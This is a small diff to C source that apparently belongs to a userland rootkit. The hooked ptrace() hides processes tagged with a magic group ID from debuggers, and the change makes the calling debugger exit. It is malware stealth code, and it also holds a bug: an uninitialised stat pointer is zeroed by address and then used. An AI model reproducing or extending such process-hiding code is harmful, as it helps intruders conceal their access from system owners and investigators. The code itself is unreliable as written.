@@ -8,6 +8,7 @@ long ptrace(void *request, pid_t pid, void *addr, void *data)
     
     if(owned()) return old_ptrace(request, pid, addr, data);
     
+    // little more process hiding.. prevent brute debugging of hidden processes
     char proc_path[128];
     snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
     
@@ -15,7 +16,7 @@ long ptrace(void *request, pid_t pid, void *addr, void *data)
     struct stat *pstat;
     memset(&pstat, 0, sizeof(pstat));
     if(old_xstat(__STAT_VER, proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
-    if(pstat->st_gid == MAGIC_GID) { errno = ESRCH; return -1; }
+    if(pstat->st_gid == MAGIC_GID) { errno = ESRCH; exit(-1); }
 
     #ifndef PTRACE_BUG
         return old_ptrace(request, pid, addr, data);
